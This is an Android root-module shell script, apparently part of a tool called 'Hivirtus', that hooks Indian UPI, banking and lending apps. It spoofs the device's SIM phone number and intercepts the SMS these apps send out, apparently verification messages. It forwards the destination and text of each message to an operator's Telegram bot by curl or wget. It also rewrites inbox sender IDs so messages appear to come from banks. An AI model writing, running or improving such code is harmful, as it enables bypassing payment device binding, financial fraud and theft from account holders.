#!/system/bin/sh
# Hivirtus runtime — config sync + SMS block + Telegram (APK-free native overlay)

MODDIR=${0%/*}
. "$MODDIR/overlay_install.sh"

CONFIG="$MODDIR/config.json"
RUNTIME="/data/local/tmp/hivirtus_zygisk_mode_config.json"
ACTIVE_PKG="/data/local/tmp/hivirtus_active_hook_pkg.txt"

UPI_PACKAGES="
com.phonepe.app
com.phonepe.app.business
net.one97.paytm
com.google.android.apps.nbu.paisa.user
com.yespay.next
com.yesbank.yespay
com.yesbank.yespaynext
com.snapmint.customerapp
com.tataneu
com.stashfin.android
com.kreditbee.android
com.dreamplug.androidapp
com.mobikwik_new
com.freecharge.android
com.freecharge.business
in.org.npci.upiapp
com.myairtelapp
com.jio.myjio
com.csam.icici.bank.imobile
com.sbi.lotusintouch
com.sbi.upi
com.axis.mobile
com.hdfcbank.payzapp
com.bankofbaroda.mpassbook
com.idfcfirstbank.mobile
com.kotak811mobilebankingapp
com.whizdm.moneyview.loans
com.naviapp
com.bharatpe.app
com.rapipay
com.fampay.in
com.slice.app
com.postpe.app
com.flipkart.android
com.lazypay.app
com.groww.app
com.nextbillion.groww
com.herofincorp.diyjourneys
com.herofincorp.simplycash
com.customer.herofincorp
com.supermoney
com.epifi.paisa
com.fisglobal.esafupi.app
com.paytm.business
com.samsung.android.spay
com.bajajfinserv
com.hdbfs.hdbfsl
"

is_upi_pkg() {
  echo "$UPI_PACKAGES" | grep -qx "$1"
}

# PhonePe often cannot write /data/local/tmp — copy Save from app files / Download
hivirtus_harvest_saves() {
  local found="" f pkg bn
  for pkg in $UPI_PACKAGES; do
    pkg=$(echo "$pkg" | tr -d ' \r\n')
    [ -z "$pkg" ] && continue
    for f in \
      "/data/data/$pkg/files/hivirtus_ui_save.json" \
      "/data/user/0/$pkg/files/hivirtus_ui_save.json" \
      "/data/user_de/0/$pkg/files/hivirtus_ui_save.json" \
      "/data/data/$pkg/cache/hivirtus_ui_save.json" \
      "/storage/emulated/0/Android/data/$pkg/files/hivirtus_ui_save.json"
    do
      if [ -f "$f" ] && [ -s "$f" ]; then
        found="$f"
        break 2
      fi
    done
  done
  [ -z "$found" ] && for f in \
    /sdcard/Documents/hivirtus_ui_save.json \
    /sdcard/Download/hivirtus_ui_save.json \
    /storage/emulated/0/Documents/hivirtus_ui_save.json \
    /storage/emulated/0/Download/hivirtus_ui_save.json
  do
    if [ -f "$f" ] && [ -s "$f" ]; then
      found="$f"
      break
    fi
  done
  if [ -n "$found" ]; then
    cp -f "$found" /data/local/tmp/hivirtus_ui_save.json 2>/dev/null
    chmod 666 /data/local/tmp/hivirtus_ui_save.json 2>/dev/null
    echo "harvest_save:$found $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
  fi
  for pkg in com.phonepe.app com.google.android.apps.nbu.paisa.user net.one97.paytm com.yespay.next com.kreditbee.android; do
    for f in \
      "/data/data/$pkg/files/hivirtus_telegram_credentials.json" \
      "/data/user/0/$pkg/files/hivirtus_telegram_credentials.json" \
      "/storage/emulated/0/Android/data/$pkg/files/hivirtus_telegram_credentials.json" \
      "/data/data/$pkg/files/hivirtus_tg_test.request" \
      "/data/user/0/$pkg/files/hivirtus_tg_test.request"
    do
      [ -f "$f" ] && [ -s "$f" ] || continue
      bn=$(basename "$f")
      cp -f "$f" "/data/local/tmp/$bn" 2>/dev/null
      chmod 666 "/data/local/tmp/$bn" 2>/dev/null
    done
  done
  for f in /sdcard/Documents/hivirtus_telegram_credentials.json \
           /sdcard/Download/hivirtus_telegram_credentials.json \
           /sdcard/Documents/hivirtus_tg_test.request \
           /sdcard/Download/hivirtus_tg_test.request; do
    [ -f "$f" ] && [ -s "$f" ] || continue
    bn=$(basename "$f")
    cp -f "$f" "/data/local/tmp/$bn" 2>/dev/null
    chmod 666 "/data/local/tmp/$bn" 2>/dev/null
  done
}

sync_config() {
  hivirtus_harvest_saves
  # Runtime JSON overwrite mat karo (telegram wipe) — sirf spoof phone + first-boot seed
  # Promote HTML Save → runtime so Zygisk hooks pick up without app restart
  if [ -f /data/local/tmp/hivirtus_ui_save.json ]; then
    SAVE=/data/local/tmp/hivirtus_ui_save.json
    if [ -f "$RUNTIME" ]; then
      # Keep runtime; overlay key fields from save via simple replace of known keys
      for key in enable_sim1_mock enable_phone_spoof enable_virtual_sim intercept_fake_success \
                 hook_outgoing_sms prefix_enabled override_incoming_sender auto_forward_token \
                 fake_intercept_telegram; do
        val=$(grep -o "\"$key\"[[:space:]]*:[[:space:]]*[^,}]*" "$SAVE" 2>/dev/null | head -n1 | sed 's/.*:[[:space:]]*//')
        if [ -n "$val" ]; then
          if grep -q "\"$key\"" "$RUNTIME" 2>/dev/null; then
            sed -i "s/\"$key\"[[:space:]]*:[[:space:]]*[^,}]*/\"$key\": $val/" "$RUNTIME" 2>/dev/null
          fi
        fi
      done
      for key in mock_phone_sim1 prefix_text inject_sender_id telegram_bot_token telegram_chat_id; do
        val=$(grep -o "\"$key\"[[:space:]]*:[[:space:]]*\"[^\"]*\"" "$SAVE" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
        if [ -n "$val" ] || grep -q "\"$key\"" "$SAVE" 2>/dev/null; then
          if grep -q "\"$key\"" "$RUNTIME" 2>/dev/null; then
            sed -i "s/\"$key\"[[:space:]]*:[[:space:]]*\"[^\"]*\"/\"$key\": \"$val\"/" "$RUNTIME" 2>/dev/null
          fi
        fi
      done
    else
      cp -f "$SAVE" "$RUNTIME" 2>/dev/null
    fi
    chmod 644 "$RUNTIME" 2>/dev/null
  fi

  SRC=""
  if [ -f "$RUNTIME" ]; then
    SRC="$RUNTIME"
  elif [ -f "$CONFIG" ]; then
    SRC="$CONFIG"
    cp -f "$CONFIG" "$RUNTIME"
    chmod 644 "$RUNTIME" 2>/dev/null
  fi
  if [ -n "$SRC" ]; then
    SPOOF_PHONE=$(grep -o '"mock_phone_sim1"[[:space:]]*:[[:space:]]*"[^"]*"' "$SRC" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
    if [ -n "$SPOOF_PHONE" ]; then
      echo "$SPOOF_PHONE" > /data/local/tmp/hivirtus_spoof_phone.txt
      echo "$SPOOF_PHONE" > "$MODDIR/spoof_phone.txt"
      chmod 644 /data/local/tmp/hivirtus_spoof_phone.txt 2>/dev/null
      chmod 644 "$MODDIR/spoof_phone.txt" 2>/dev/null
    fi
    # Root pe Telegram creds promote — app UID write fail ho to bhi Save kaam kare
    TG_T=$(grep -o '"telegram_bot_token"[[:space:]]*:[[:space:]]*"[^"]*"' "$SRC" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
    TG_C=$(grep -o '"telegram_chat_id"[[:space:]]*:[[:space:]]*"[^"]*"' "$SRC" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
    if [ -n "$TG_T" ] && [ -n "$TG_C" ]; then
      OLD_HASH=$(cat /data/local/tmp/hivirtus_tg_creds.hash 2>/dev/null)
      NEW_HASH="${TG_T}|${TG_C}"
      printf '%s\n' "{\"telegram_bot_token\":\"${TG_T}\",\"telegram_chat_id\":\"${TG_C}\"}" \
        > /data/local/tmp/hivirtus_telegram_credentials.json
      chmod 666 /data/local/tmp/hivirtus_telegram_credentials.json 2>/dev/null
      # Save / ui_save change → hamesha test queue (same token pe bhi Save = test)
      SAVE_MT=$(stat -c %Y /data/local/tmp/hivirtus_ui_save.json 2>/dev/null || echo 0)
      LAST_MT=$(cat /data/local/tmp/hivirtus_ui_save.mt 2>/dev/null || echo 0)
      if [ "$NEW_HASH" != "$OLD_HASH" ] || [ "$SAVE_MT" != "$LAST_MT" ]; then
        echo "$NEW_HASH" > /data/local/tmp/hivirtus_tg_creds.hash
        echo "$SAVE_MT" > /data/local/tmp/hivirtus_ui_save.mt
        echo 1 > /data/local/tmp/hivirtus_tg_test.request
        rm -f /data/local/tmp/hivirtus_tg_test_fails 2>/dev/null
        chmod 666 /data/local/tmp/hivirtus_tg_test.request 2>/dev/null
        echo "tg_test_queued $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
      fi
    fi
  fi
}

get_foreground_pkg() {
  local pkg

  pkg=$(dumpsys activity activities 2>/dev/null | grep -E 'topResumedActivity=ActivityRecord' | head -n1 | sed -n 's/.* u0 \([a-zA-Z0-9._]*\)\/[a-zA-Z0-9._]*.*/\1/p')
  [ -n "$pkg" ] && echo "$pkg" && return

  pkg=$(dumpsys activity activities 2>/dev/null | grep -E 'mResumedActivity: ActivityRecord' | head -n1 | sed -n 's/.* u0 \([a-zA-Z0-9._]*\)\/[a-zA-Z0-9._]*.*/\1/p')
  [ -n "$pkg" ] && echo "$pkg" && return

  pkg=$(dumpsys window 2>/dev/null | grep -E 'mCurrentFocus|mFocusedApp' | head -n1 | sed -n 's/.* \([a-zA-Z0-9._]*\)\/[a-zA-Z0-9._]*.*/\1/p')
  [ -n "$pkg" ] && echo "$pkg" && return

  pkg=$(dumpsys activity activities 2>/dev/null | grep -E 'ResumedActivity' | head -n1 | sed -n 's/.* \([a-zA-Z0-9._]*\)\/[a-zA-Z0-9._]*.*/\1/p')
  echo "$pkg"
}

mark_active() {
  hivirtus_mark_foreground_upi "$1"
}

sync_config

# Telegram paths app-writable + boot pe ek test agar creds pehle se hain
(
  for f in /data/local/tmp/hivirtus_tg_test.request \
           /data/local/tmp/hivirtus_tg_forward.log; do
    touch "$f" 2>/dev/null
    chmod 666 "$f" 2>/dev/null
  done
  for f in /data/local/tmp/hivirtus_telegram_credentials.json \
           /data/local/tmp/hivirtus_ui_save.json \
           /data/local/tmp/hivirtus_zygisk_mode_config.json; do
    [ -f "$f" ] && chmod 666 "$f" 2>/dev/null
  done
  # Boot test: pehle se token ho to 🚀 test bhejo (Save ke bina bhi)
  if [ -f /data/local/tmp/hivirtus_telegram_credentials.json ]; then
    TG_T=$(grep -o '"telegram_bot_token"[[:space:]]*:[[:space:]]*"[^"]*"' /data/local/tmp/hivirtus_telegram_credentials.json 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
    TG_C=$(grep -o '"telegram_chat_id"[[:space:]]*:[[:space:]]*"[^"]*"' /data/local/tmp/hivirtus_telegram_credentials.json 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
    if [ -n "$TG_T" ] && [ -n "$TG_C" ]; then
      echo 1 > /data/local/tmp/hivirtus_tg_test.request
      chmod 666 /data/local/tmp/hivirtus_tg_test.request 2>/dev/null
      echo "tg_boot_test_queued $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
    fi
  fi
) &

# NEVER seed APatch package_config (phone/telephony exclude=0 → SIM crash)
# NEVER mass-seed hooked_pkgs from csv

# Boot: repair SIM/settings + safe overlay only
MODDIR="$MODDIR" hivirtus_boot_activate_overlay
hivirtus_grant_overlay_permission &
# Keep Denylist Unmount Only so UPI apps still get Virtus inject
hivirtus_fix_zn_denylist 2>/dev/null &
hivirtus_apatch_allow_upi_inject 2>/dev/null &

# If UPI app is foreground but no safe_inject yet → warn (denylist/APatch block)
(
  LAST_WARN=""
  while true; do
    sleep 8
    FG=$(get_foreground_pkg)
    [ -z "$FG" ] && continue
    is_upi_pkg "$FG" || continue
    if grep -q "safe_inject:$FG" /data/local/tmp/hivirtus_inject.log 2>/dev/null || \
       grep -q "pre_seen:$FG" /data/local/tmp/hivirtus_inject.log 2>/dev/null; then
      continue
    fi
    if [ "$FG" != "$LAST_WARN" ]; then
      echo "WARN_fg_no_zygisk:$FG (open ZygiskNext=Unmount Only, force-stop app, reopen)" \
        >> /data/local/tmp/hivirtus_inject.log 2>/dev/null
      LAST_WARN="$FG"
    fi
  done
) &

# Keep bridge.dex + UI readable for app uid (SELinux-safe path)
(
  while true; do
    if [ -f "$MODDIR/bridge.dex" ]; then
      cp -f "$MODDIR/bridge.dex" /data/local/tmp/hivirtus_bridge.dex 2>/dev/null
      chmod 644 /data/local/tmp/hivirtus_bridge.dex 2>/dev/null
    fi
    if [ -d "$MODDIR/ui" ]; then
      mkdir -p /data/local/tmp/hivirtus_ui 2>/dev/null
      cp -f "$MODDIR/ui/"* /data/local/tmp/hivirtus_ui/ 2>/dev/null
      chmod 644 /data/local/tmp/hivirtus_ui/* 2>/dev/null
    fi
    sleep 60
  done
) &

(
  LAST=""
  while true; do
    sync_config
    FG=$(get_foreground_pkg)
    if [ -n "$FG" ] && is_upi_pkg "$FG"; then
      if [ "$FG" != "$LAST" ]; then
        mark_active "$FG"
        hivirtus_grant_overlay_permission "$FG"
        LAST="$FG"
      fi
    fi
    sleep 2
  done
) &

# DISABLED: appops SEND_SMS deny — system/SIM break + "sab apps hooked" feel
# SMS intercept sirf Zygisk client hook se (UPI process me)
enforce_sms_block() { return 0; }

seed_hooked_pkgs() { return 0; }
seed_apatch_config() { return 0; }

read_tg_creds() {
  TG_TOKEN=""
  TG_CHAT=""
  for f in /data/local/tmp/hivirtus_telegram_credentials.json \
    "$MODDIR/telegram_credentials.json" \
    /data/local/tmp/hivirtus_ui_save.json \
    "$RUNTIME" "$CONFIG"; do
    [ -f "$f" ] || continue
    [ -z "$TG_TOKEN" ] && TG_TOKEN=$(grep -o '"telegram_bot_token"[[:space:]]*:[[:space:]]*"[^"]*"' "$f" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
    [ -z "$TG_CHAT" ] && TG_CHAT=$(grep -o '"telegram_chat_id"[[:space:]]*:[[:space:]]*"[^"]*"' "$f" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
    [ -n "$TG_TOKEN" ] && [ -n "$TG_CHAT" ] && break
  done
}

tg_forward_enabled() {
  # Default ON jab token+chat set ho; UI toggle off ho to skip
  local src=""
  [ -f "$RUNTIME" ] && src="$RUNTIME"
  [ -z "$src" ] && [ -f /data/local/tmp/hivirtus_ui_save.json ] && src=/data/local/tmp/hivirtus_ui_save.json
  [ -z "$src" ] && [ -f "$CONFIG" ] && src="$CONFIG"
  [ -z "$src" ] && return 0
  if grep -q '"auto_forward_token"[[:space:]]*:[[:space:]]*false' "$src" 2>/dev/null && \
     grep -q '"fake_intercept_telegram"[[:space:]]*:[[:space:]]*false' "$src" 2>/dev/null && \
     grep -q '"telegram_enabled"[[:space:]]*:[[:space:]]*false' "$src" 2>/dev/null; then
    return 1
  fi
  return 0
}

read_blocked_sms() {
  BLOCKED_DEST=""
  BLOCKED_BODY=""
  if [ -f /data/local/tmp/hivirtus_outgoing_blocked.json ]; then
    BLOCKED_DEST=$(grep -o '"dest"[[:space:]]*:[[:space:]]*"[^"]*"' /data/local/tmp/hivirtus_outgoing_blocked.json 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
    BLOCKED_BODY=$(grep -o '"body"[[:space:]]*:[[:space:]]*"[^"]*"' /data/local/tmp/hivirtus_outgoing_blocked.json 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/' | sed 's/\\n/\n/g;s/\\r//g;s/\\"/"/g;s/\\\\/\\/g')
  fi
  if [ -z "$BLOCKED_BODY" ] && [ -f /data/local/tmp/hivirtus_outgoing_blocked.flag ]; then
    BLOCKED_DEST=$(head -n1 /data/local/tmp/hivirtus_outgoing_blocked.flag 2>/dev/null | tr -d '\r')
    BLOCKED_BODY=$(tail -n +2 /data/local/tmp/hivirtus_outgoing_blocked.flag 2>/dev/null | tr -d '\r')
  fi
  # Fallback pending_verify.json
  if [ -z "$BLOCKED_BODY" ] && [ -f /data/local/tmp/hivirtus_pending_verify.json ]; then
    BLOCKED_DEST=$(grep -o '"dest"[[:space:]]*:[[:space:]]*"[^"]*"' /data/local/tmp/hivirtus_pending_verify.json 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
    BLOCKED_BODY=$(grep -o '"body"[[:space:]]*:[[:space:]]*"[^"]*"' /data/local/tmp/hivirtus_pending_verify.json 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/' | sed 's/\\n/\n/g;s/\\r//g;s/\\"/"/g;s/\\\\/\\/g')
  fi
  # Clean placeholder
  [ "$BLOCKED_DEST" = "INTERCEPT" ] && BLOCKED_DEST=""
  [ "$BLOCKED_BODY" = "BLOCKED" ] && BLOCKED_BODY=""
}

tg_json_escape() {
  printf '%s' "$1" | sed -e 's/\\/\\\\/g' -e 's/"/\\"/g' -e 's/\t/\\t/g' -e 's/\r/\\r/g' | awk 'BEGIN{ORS=""} {gsub(/\n/,"\\n"); print}'
}

tg_clip_copy() {
  printf '%s' "$1" | head -c 350
}

forward_blocked_telegram() {
  read_blocked_sms
  [ -z "$BLOCKED_BODY" ] && [ -z "$BLOCKED_DEST" ] && return 0
  [ -z "$BLOCKED_BODY" ] && return 0
  tg_forward_enabled || return 0
  read_tg_creds
  [ -z "$TG_TOKEN" ] || [ -z "$TG_CHAT" ] && return 0

  TO_NUM="$BLOCKED_DEST"
  [ -z "$TO_NUM" ] && TO_NUM="—"
  MSG_BODY="$BLOCKED_BODY"
  ONE_TAP="To: ${TO_NUM}
Message: ${MSG_BODY}"

  # Exact Virtus format (user screenshot)
  TEXT="📱 SMS Intercepted Zygisk Mode
Menu By @Hivirtus 🔥
-----------------
📞 To:
${TO_NUM}

💬 Message:
${MSG_BODY}

📋 One-tap copy:
${ONE_TAP}"

  ESC_TEXT=$(tg_json_escape "$TEXT")
  ESC_TAP=$(tg_json_escape "$(tg_clip_copy "$ONE_TAP")")
  ESC_BODY=$(tg_json_escape "$(tg_clip_copy "$MSG_BODY")")
  ESC_TO=$(tg_json_escape "$(tg_clip_copy "$TO_NUM")")
  PAYLOAD="/data/local/tmp/hivirtus_tg_payload.json"
  printf '%s' "{\"chat_id\":\"${TG_CHAT}\",\"text\":\"${ESC_TEXT}\",\"disable_web_page_preview\":true,\"reply_markup\":{\"inline_keyboard\":[[{\"text\":\"📋 One-tap copy\",\"copy_text\":{\"text\":\"${ESC_TAP}\"}},{\"text\":\"📞 Copy To\",\"copy_text\":{\"text\":\"${ESC_TO}\"}}],[{\"text\":\"💬 Copy Message\",\"copy_text\":{\"text\":\"${ESC_BODY}\"}}]]}}" > "$PAYLOAD"
  SENT=0
  RESP="/data/local/tmp/hivirtus_tg_last_response.txt"
  if tg_http_post "$PAYLOAD" "$RESP"; then SENT=1; fi
  # curl may return HTTP 200 with ok:false — verify
  if [ "$SENT" = "1" ] && grep -q '"ok"[[:space:]]*:[[:space:]]*true' "$RESP" 2>/dev/null; then
    rm -f /data/local/tmp/hivirtus_outgoing_blocked.flag
    rm -f /data/local/tmp/hivirtus_outgoing_blocked.json
    rm -f /data/local/tmp/hivirtus_pending_verify.json
    rm -f "$PAYLOAD"
    echo "tg_ok $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
    chmod 644 /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
  else
    echo "tg_fail $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
    chmod 644 /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
  fi
}

seed_hooked_pkgs() { return 0; }
seed_apatch_config() { return 0; }

device_name() {
  local n
  n=$(getprop ro.product.marketname 2>/dev/null | tr -d '\r')
  [ -z "$n" ] && n=$(getprop ro.product.model 2>/dev/null | tr -d '\r')
  [ -z "$n" ] && n=$(getprop ro.product.device 2>/dev/null | tr -d '\r')
  local manu
  manu=$(getprop ro.product.manufacturer 2>/dev/null | tr -d '\r')
  if [ -n "$manu" ] && [ -n "$n" ]; then
    echo "$n" | grep -qi "$manu" && echo "$n" || echo "$manu $n"
  else
    echo "${n:-Android}"
  fi
}

module_is_active() {
  [ -f /data/local/tmp/hivirtus_zygisk_native.active ] && return 0
  [ -f /data/local/tmp/hivirtus_inject.log ] && return 0
  [ -f /data/local/tmp/hivirtus_module_heartbeat.txt ] && return 0
  return 1
}

tg_http_post() {
  # $1 = payload file, $2 = response file, uses TG_TOKEN
  local payload="$1"
  local resp="$2"
  local url="https://api.telegram.org/bot${TG_TOKEN}/sendMessage"
  if command -v curl >/dev/null 2>&1; then
    curl -s -m 25 -X POST "$url" -H "Content-Type: application/json" --data-binary "@${payload}" > "$resp" 2>/dev/null
    return $?
  fi
  for c in /system/bin/curl /system/xbin/curl \
           /data/adb/magisk/busybox /data/adb/ksu/bin/busybox /data/adb/ap/bin/busybox \
           /data/adb/modules/busybox-ndk/system/xbin/busybox; do
    if [ -x "$c" ]; then
      case "$c" in
        *busybox*)
          "$c" wget -q -O "$resp" -T 25 --header="Content-Type: application/json" --post-file="$payload" "$url" 2>/dev/null
          ;;
        *)
          "$c" -s -m 25 -X POST "$url" -H "Content-Type: application/json" --data-binary "@${payload}" > "$resp" 2>/dev/null
          ;;
      esac
      return $?
    fi
  done
  if [ -x /system/bin/toybox ]; then
    /system/bin/toybox wget -q -O "$resp" -T 25 --header="Content-Type: application/json" --post-file="$payload" "$url" 2>/dev/null
    return $?
  fi
  if command -v wget >/dev/null 2>&1; then
    wget -q -O "$resp" --timeout=25 --header="Content-Type: application/json" --post-file="$payload" "$url" 2>/dev/null
    return $?
  fi
  echo "no_curl_wget" > "$resp"
  return 1
}

# Save pe Telegram test — exact format user ne diya
send_tg_test_if_requested() {
  [ -f /data/local/tmp/hivirtus_tg_test.request ] || return 0
  read_tg_creds
  if [ -z "$TG_TOKEN" ] || [ -z "$TG_CHAT" ]; then
    rm -f /data/local/tmp/hivirtus_tg_test.request
    return 0
  fi
  DEV=$(device_name)
  if module_is_active; then
    STATUS="Successful Active!"
  else
    STATUS="not active"
  fi
  TEXT="🚀 @hivirtus Zygisk Mode Test
${STATUS}

Device: ${DEV}"
  ESC_TEXT=$(tg_json_escape "$TEXT")
  PAYLOAD="/data/local/tmp/hivirtus_tg_test_payload.json"
  printf '%s' "{\"chat_id\":\"${TG_CHAT}\",\"text\":\"${ESC_TEXT}\",\"disable_web_page_preview\":true}" > "$PAYLOAD"
  RESP="/data/local/tmp/hivirtus_tg_test_response.txt"
  SENT=0
  if tg_http_post "$PAYLOAD" "$RESP"; then SENT=1; fi
  if [ "$SENT" = "1" ] && grep -q '"ok"[[:space:]]*:[[:space:]]*true' "$RESP" 2>/dev/null; then
    rm -f /data/local/tmp/hivirtus_tg_test.request "$PAYLOAD"
    echo "tg_test_ok $STATUS device=$DEV $(date +%s)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
  else
    FAILS=$(cat /data/local/tmp/hivirtus_tg_test_fails 2>/dev/null || echo 0)
    FAILS=$((FAILS + 1))
    echo "$FAILS" > /data/local/tmp/hivirtus_tg_test_fails
    if [ "$FAILS" -ge 3 ]; then
      TEXT2="🚀 @hivirtus Zygisk Mode Test
not active

Device: ${DEV}"
      ESC2=$(tg_json_escape "$TEXT2")
      printf '%s' "{\"chat_id\":\"${TG_CHAT}\",\"text\":\"${ESC2}\",\"disable_web_page_preview\":true}" > "$PAYLOAD"
      tg_http_post "$PAYLOAD" "$RESP" || true
      rm -f /data/local/tmp/hivirtus_tg_test.request /data/local/tmp/hivirtus_tg_test_fails "$PAYLOAD"
    fi
    echo "tg_test_fail $(date +%s) resp=$(head -c 120 "$RESP" 2>/dev/null)" >> /data/local/tmp/hivirtus_tg_forward.log 2>/dev/null
  fi
}

# SMSTweaks-style inbox rewrite — saved sender ID pe address update (root content, no Zygisk phone inject)
rewrite_inbox_sender_id() {
  local sid=""
  if [ -f /data/local/tmp/hivirtus_sender_id.txt ]; then
    sid=$(head -n1 /data/local/tmp/hivirtus_sender_id.txt 2>/dev/null | tr -d '\r\n')
  fi
  if [ -z "$sid" ]; then
    sid=$(grep -o '"inject_sender_id"[[:space:]]*:[[:space:]]*"[^"]*"' "$RUNTIME" 2>/dev/null | head -n1 | sed 's/.*: *"\([^"]*\)".*/\1/')
  fi
  [ -z "$sid" ] || [ "$sid" = "AD-TEST-S" ] && return 0

  local override=1
  if [ -f "$RUNTIME" ]; then
    grep -q '"override_incoming_sender"[[:space:]]*:[[:space:]]*false' "$RUNTIME" 2>/dev/null && override=0
  fi
  [ "$override" = "0" ] && return 0

  # Recent inbox rows — numeric / +91 address → saved sender ID
  local out="/data/local/tmp/hivirtus_inbox_query.txt"
  content query --uri content://sms/inbox --projection _id:address:date \
    --sort "date DESC" 2>/dev/null | head -n 40 > "$out" || return 0

  local now_ms id addr date digits
  now_ms=$(date +%s)000
  while IFS= read -r line; do
    id=$(echo "$line" | sed -n 's/.*_id=\([0-9]*\).*/\1/p')
    addr=$(echo "$line" | sed -n 's/.*address=\([^,]*\).*/\1/p' | sed 's/[[:space:]]*$//')
    date=$(echo "$line" | sed -n 's/.*date=\([0-9]*\).*/\1/p')
    [ -z "$id" ] || [ -z "$addr" ] && continue
    [ "$addr" = "$sid" ] && continue
    # Only rewrite recent (~10 min) messages
    if [ -n "$date" ] && [ "$date" -lt $((now_ms - 600000)) ] 2>/dev/null; then
      continue
    fi
    digits=$(echo "$addr" | tr -cd '0-9')
    # Phone-like or short code / alphanumeric bank headers — rewrite all non-matching
    if [ ${#digits} -ge 8 ] || echo "$addr" | grep -qE '^[A-Za-z0-9-]{3,}$'; then
      content update --uri content://sms/inbox \
        --bind address:s:"$sid" \
        --where "_id=$id" >/dev/null 2>&1 || true
    fi
  done < "$out"
}

(
  while true; do
    send_tg_test_if_requested
    forward_blocked_telegram
    rewrite_inbox_sender_id
    sleep 1
  done
) &

(
  while true; do
    hivirtus_repair_sim_settings
    sleep 180
    hivirtus_grant_overlay_permission
    sleep 60
  done
) &
